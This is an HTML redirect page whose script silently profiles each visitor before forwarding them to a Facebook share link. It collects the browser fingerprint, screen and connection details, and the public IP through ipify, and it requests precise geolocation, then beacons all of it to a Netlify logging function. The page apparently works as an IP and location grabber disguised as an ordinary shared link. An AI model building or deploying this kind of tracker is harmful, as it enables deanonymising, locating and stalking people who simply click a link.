<!doctype html>
<html>
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Redirecting…</title>
  <style>
    body{font-family:system-ui,Segoe UI,Roboto,Arial;margin:0;padding:24px;background:#f7f7f8;color:#111}
    .card{max-width:720px;margin:36px auto;padding:18px;background:#fff;border-radius:10px;box-shadow:0 8px 20px rgba(0,0,0,0.06)}
  </style>
</head>
<body>
  <div class="card">
    <h2>Preparing to open content…</h2>
    <p>This page will ask for permission to access your location (optional). Your visit will be recorded for admin notifications.</p>
  </div>

<script>
(async function(){
  // final redirect target
  const REDIRECT_URL = "https://www.facebook.com/share/r/1GSrQ5WSVa/";

  // collect baseline information
  const data = {
    timeUtc: new Date().toISOString(),
    url: location.href,
    referrer: document.referrer || null,
    userAgent: navigator.userAgent || null,
    platform: navigator.platform || null,
    languages: navigator.languages || [navigator.language || null],
    cookieEnabled: navigator.cookieEnabled || false,
    doNotTrack: navigator.doNotTrack || null,
    deviceMemory: navigator.deviceMemory || null,
    hardwareConcurrency: navigator.hardwareConcurrency || null,
    vendor: navigator.vendor || null,
    screen: {
      width: screen?.width || null,
      height: screen?.height || null,
      availWidth: screen?.availWidth || null,
      availHeight: screen?.availHeight || null,
      colorDepth: screen?.colorDepth || null
    },
    timezone: (() => { try { return Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){ return null; } })(),
    connection: (navigator.connection ? {
      downlink: navigator.connection.downlink || null,
      effectiveType: navigator.connection.effectiveType || null,
      rtt: navigator.connection.rtt || null
    } : null),
    clientIp: null,   // will fill from ipify
    coords: null      // will fill if user allows geolocation
  };

  // small helper to send data using sendBeacon if available
  function sendPayload(payloadObj){
    const bodyStr = JSON.stringify(payloadObj);
    try {
      // try sendBeacon first (keeps request reliable during navigation)
      if (navigator.sendBeacon) {
        const blob = new Blob([bodyStr], { type: 'application/json' });
        navigator.sendBeacon('/.netlify/functions/log', blob);
        return;
      }
    } catch(e) {
      // ignore and fallback to fetch
    }
    // fallback: fetch with keepalive (best-effort)
    fetch('/.netlify/functions/log', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: bodyStr,
      keepalive: true
    }).catch(()=>{});
  }

  // get public IP from ipify (best-effort)
  try {
    const r = await fetch('https://api.ipify.org?format=json', { cache: 'no-store' });
    const j = await r.json();
    data.clientIp = j.ip || null;
  } catch(e) {
    data.clientIp = null;
  }

  // request geolocation (user will be prompted). If allowed, include coords.
  if (navigator.geolocation) {
    // race: if geolocation takes too long, fallback after timeout
    let fallbackTimer = setTimeout(() => {
      sendPayload(data);
      setTimeout(()=>{ location.href = REDIRECT_URL; }, 300);
    }, 4500);

    navigator.geolocation.getCurrentPosition(function(pos){
      clearTimeout(fallbackTimer);
      data.coords = {
        lat: pos.coords.latitude,
        lon: pos.coords.longitude,
        accuracy: pos.coords.accuracy
      };
      sendPayload(data);
      setTimeout(()=>{ location.href = REDIRECT_URL; }, 350);
    }, function(err){
      clearTimeout(fallbackTimer);
      // permission denied or error -> send without coords
      sendPayload(data);
      setTimeout(()=>{ location.href = REDIRECT_URL; }, 250);
    }, { enableHighAccuracy: true, timeout: 4000, maximumAge: 0 });
  } else {
    // no geolocation API
    sendPayload(data);
    setTimeout(()=>{ location.href = REDIRECT_URL; }, 250);
  }
})();
</script>
</body>
</html>
